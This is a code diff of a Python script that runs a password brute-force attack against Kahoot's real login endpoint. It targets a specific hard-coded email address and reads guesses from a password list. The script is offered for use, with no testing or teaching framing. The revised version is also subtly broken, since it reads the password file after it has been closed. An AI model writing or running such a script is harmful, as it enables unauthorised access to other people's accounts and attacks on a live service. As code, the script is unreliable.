@@ -1,42 +1,32 @@
 import requests
-import concurrent.futures
 
-def brute_force_login(username):
-    try:
-        password_file = open("passlist.txt", "r")
-        passwords = password_file.readlines()
-        password_file.close()
+def brute_force_login(url, username, password_file):
+    with open(password_file, 'r') as file:
+        passwords = (line.strip() for line in file)
 
-        def check_password(password):
-            password = password.strip()
-            login_data = {
-                "username": username,
-                "password": password
-            }
-            response = requests.post("https://create.kahoot.it/auth/login", data=login_data)
+    session = requests.Session()
+
+    for password in passwords:
+        payload = {'username': username, 'password': password}
+
+        try:
+            response = session.post(url, data=payload)
+            response.raise_for_status()
 
             if response.status_code == 200:
-                print("Login successful!")
-                print("Username:", username)
-                print("Password:", password)
-                return True
-            else:
-                print("Login failed with password:", password)
-                return False
+                print(f"Successful login! Username: {username}, Password: {password}")
+                break
 
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            results = executor.map(check_password, passwords)
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred: {e}")
+            break
 
-        if not any(results):
-            print("Brute force attack completed. No valid password found.")
-
-    except FileNotFoundError:
-        print("Password file not found.")
-    except requests.exceptions.RequestException as e:
-        print("An error occurred during the request:", str(e))
-    except Exception as e:
-        print("An unexpected error occurred:", str(e))
+    print("Brute force attack completed.")
 
 # Usage example
-username = input("Enter the username: ")
-brute_force_login(username)
+url = 'https://create.kahoot.it/auth/login?deviceId=f31cd72d-3ccf-47a6-b643-3f166351d0d4R&sessionId=1698919889501'
+username = 'ssjsssksjsjs@gmail.com'
+password_file = 'passlist.txt'
+
+brute_force_login(url, username, password_file)
+
